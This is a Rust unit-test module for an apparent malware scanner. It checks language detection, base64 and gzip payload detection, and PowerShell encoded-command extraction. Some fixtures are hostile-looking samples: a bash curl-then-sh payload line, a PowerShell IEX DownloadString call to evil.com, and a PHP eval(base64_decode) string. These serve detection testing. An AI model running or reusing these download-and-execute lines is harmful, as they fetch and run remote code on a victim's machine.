    fn make_string_info(value: &str) -> StringInfo {
        StringInfo {
            value: value.to_string(),
            offset: Some(0),
            string_type: None,
            encoding: "utf-8".to_string(),
            section: None,
            encoding_chain: Vec::new(),
            fragments: None,
        }
    }

    fn make_string_info_at_offset(value: &str, offset: u64) -> StringInfo {
        let mut info = make_string_info(value);
        info.offset = Some(offset);
        info
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_detect_python() {
        // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
        let code = "import os\nimport sys\ndef main():\n    os.system('ls -la')\n    sys.exit(0)";
        let info = make_string_info(code);
        assert_eq!(detect_language(&info, false), Some(FileType::Python));
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_detect_javascript() {
        // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
        let code =
            "function test() {\n  const x = require('fs');\n  eval(x);\n  console.log('done');\n}";
        let info = make_string_info(code);
        assert_eq!(detect_language(&info, false), Some(FileType::JavaScript));
    }

    #[test]
    fn test_reject_source_map_payload() {
        let source_map = r#"{"version":3,"sources":["x.js"],"names":[],"mappings":"AAAA","sourcesContent":["function test(){return 1;}"]}"#;
        let info = make_string_info(source_map);
        assert_eq!(detect_language(&info, true), None);
    }

    #[test]
    fn test_dedup_identical_base64_binary_payloads() {
        use base64::Engine;

        let mut payload = Vec::with_capacity(192);
        payload.extend_from_slice(&[0x1F, 0x8B, 0x08, 0x00]);
        payload.resize(192, 0u8);
        let payload = base64::engine::general_purpose::STANDARD.encode(&payload);
        let strings = vec![
            make_string_info_at_offset(&payload, 0x230),
            make_string_info_at_offset(&payload, 0x231),
        ];
        let mapper = Arc::new(CapabilityMapper::default());

        let (encoded_layers, plain_findings) =
            process_all_strings("sample.ts", &strings, &mapper, 0, None);

        assert!(plain_findings.is_empty());
        assert_eq!(encoded_layers.len(), 1);
        assert_eq!(encoded_layers[0].file_type, "gz");
    }

    #[test]
    fn test_top_level_self_detection_for_php_is_suppressed() {
        assert!(is_top_level_self_detection(
            "archive.zip!!src/ParseException.php",
            false,
            0,
            &FileType::Php
        ));
        assert!(!is_top_level_self_detection(
            "archive.zip!!src/ParseException.php",
            true,
            0,
            &FileType::Php
        ));
        assert!(!is_top_level_self_detection(
            "archive.zip!!src/ParseException.php",
            false,
            32,
            &FileType::Php
        ));
        assert!(is_top_level_self_detection(
            "archive.zip!!src/ParseException.php",
            false,
            0,
            &FileType::JavaScript
        ));
    }

    #[test]
    fn test_top_level_self_detection_for_c_shell_misclassification_is_suppressed() {
        assert!(is_top_level_self_detection(
            "include/sound/sdca_function.h",
            false,
            0,
            &FileType::Shell
        ));
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_detect_shell() {
        // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
        let code =
            "#!/bin/bash\necho 'hello world'\ncurl http://example.com/payload\nsh -c 'payload'";
        let info = make_string_info(code);
        assert_eq!(detect_language(&info, false), Some(FileType::Shell));
    }

    #[test]
    fn test_reject_xor_gibberish_misclassified_as_shell() {
        let gibberish = "`(1 89;5dy3;+$-j1=17q8m*`g^LE";
        let info = StringInfo {
            value: gibberish.to_string(),
            offset: Some(0x27f6),
            string_type: Some(crate::types::binary::StringType::ShellCmd),
            encoding: "utf-8".to_string(),
            section: None,
            encoding_chain: vec!["xor".to_string()],
            fragments: None,
        };
        assert_eq!(detect_language(&info, true), None);
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_detect_php() {
        // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
        let code = "<?php eval(base64_decode('test')); echo 'malware'; ?>";
        let info = make_string_info(code);
        assert_eq!(detect_language(&info, false), Some(FileType::Php));
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_reject_phpish_binary_noise() {
        let noise = "p`phpfpp`phpjp`phpp`phpfp`phpjp`phpfpp`phpjp`php";
        let info = StringInfo {
            value: noise.to_string(),
            offset: Some(0),
            string_type: Some(crate::types::binary::StringType::PhpCode),
            encoding: "utf-8".to_string(),
            section: None,
            encoding_chain: Vec::new(),
            fragments: None,
        };
        assert_eq!(detect_language(&info, false), None);
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_reject_plain_text() {
        let text = "This is just some regular text without code.";
        let info = make_string_info(text);
        assert_eq!(detect_language(&info, false), None);
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_reject_too_small() {
        let code = "import os"; // Less than MIN_PLAIN_SIZE
        let info = make_string_info(code);
        assert_eq!(detect_language(&info, false), None);
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_encoded_lower_threshold() {
        let code = "import os\ndef main():\n    pass"; // Only 1 match
        let info = make_string_info(code);
        assert_eq!(detect_language(&info, true), Some(FileType::Python));
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_entropy_calculation() {
        let data = b"aaaaaaaaaa";
        let entropy = calculate_entropy(data);
        assert!(entropy < 1.0); // Low entropy

        // Use more varied data for higher entropy test
        let varied = b"abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
        let entropy = calculate_entropy(varied);
        assert!(entropy > 3.0); // Higher entropy (many unique bytes)
    }

    // ── base64 binary detection tests ─────────────────────────────────────────

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_looks_like_base64_valid() {
        // 96 bytes → 128-char base64 (> MIN_BASE64_LEN=100)
        use base64::Engine;
        let raw = b"Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!";
        let s = base64::engine::general_purpose::STANDARD.encode(raw);
        assert!(
            s.len() >= MIN_BASE64_LEN,
            "test string too short: {}",
            s.len()
        );
        assert!(looks_like_base64(&s));
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_looks_like_base64_too_short() {
        assert!(!looks_like_base64("SGVsbG8="));
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_looks_like_base64_rejects_prose() {
        let prose = "This is a normal English sentence with spaces and punctuation, which is definitely not base64 encoded binary content at all.";
        assert!(!looks_like_base64(prose));
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_detect_base64_binary_gzip() {
        // Keep this above the compressed-payload floor so real wrappers still detect.
        let mut payload = Vec::with_capacity(192);
        payload.extend_from_slice(&[0x1F, 0x8B, 0x08, 0x00]); // gzip magic
        payload.resize(192, 0u8);
        use base64::Engine;
        let encoded = base64::engine::general_purpose::STANDARD.encode(&payload);
        assert!(
            encoded.len() >= MIN_BASE64_LEN,
            "encoded too short: {}",
            encoded.len()
        );
        let info = make_string_info(&encoded);
        let result = detect_base64_binary("test.sh", &info, 0);
        assert!(
            result.is_some(),
            "should detect base64-encoded gzip payload"
        );
        let entry = result.unwrap();
        assert!(
            entry.findings.iter().any(|f| f.id.contains("base64-gz")),
            "expected base64-gz finding, got: {:?}",
            entry.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_detect_base64_binary_rejects_random() {
        use base64::Engine;
        let random_bytes: Vec<u8> = (0u8..=127).collect();
        let encoded = base64::engine::general_purpose::STANDARD.encode(&random_bytes);
        let info = make_string_info(&encoded);
        assert!(detect_base64_binary("test.sh", &info, 0).is_none());
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_detect_base64_binary_rejects_tiny_elf_fixture() {
        let encoded =
            "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAB\
AAAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAfQAAAAAAAAB9AAAAAAAAAAAA\
IAAAAAAAsDyZDwU=";
        let info = make_string_info(encoded);
        assert!(detect_base64_binary("test.go", &info, 0).is_none());
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_detect_base64_binary_skipped_at_depth_gt_0() {
        use base64::Engine;
        let mut payload = vec![0x1F, 0x8Bu8, 0x08, 0x00];
        payload.resize(75, 0u8);
        let encoded = base64::engine::general_purpose::STANDARD.encode(&payload);
        let info = make_string_info(&encoded);
        assert!(detect_base64_binary("test.sh", &info, 1).is_none());
    }

    // ── PowerShell -EncodedCommand tests ──────────────────────────────────────

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_extract_ps_encoded_arg_found() {
        let s = "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==";
        assert!(extract_ps_encoded_arg(s).is_some());
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_extract_ps_encoded_arg_not_found() {
        let s = "powershell -Command Write-Output hello";
        assert!(extract_ps_encoded_arg(s).is_none());
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_has_ps_keywords_positive() {
        let s = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com')";
        assert!(has_ps_keywords(s));
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_has_ps_keywords_negative() {
        let s = "echo hello world";
        assert!(!has_ps_keywords(s));
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_decode_utf16le_valid() {
        use base64::Engine;
        let utf16: Vec<u8> = "IEX".encode_utf16().flat_map(u16::to_le_bytes).collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
        let result = decode_utf16le(&b64);
        assert_eq!(result.as_deref(), Some("IEX"));
    }

    #[test]
    #[allow(clippy::unwrap_used)]
    fn test_decode_utf16le_invalid_odd_length() {
        use base64::Engine;
        let bytes = vec![0x41u8, 0x00, 0x42]; // odd length
        let b64 = base64::engine::general_purpose::STANDARD.encode(&bytes);
        assert!(decode_utf16le(&b64).is_none());
    }

    #[test]
    fn test_is_real_shell_rejects_cli_help_snippet() {
        let s = "Binary output can mess up your terminal. Use \"--output -\" to tell curl to output it to your terminal anyway, or consider \"--output <FILE>\".";
        assert!(!is_real_shell(s));
    }
}
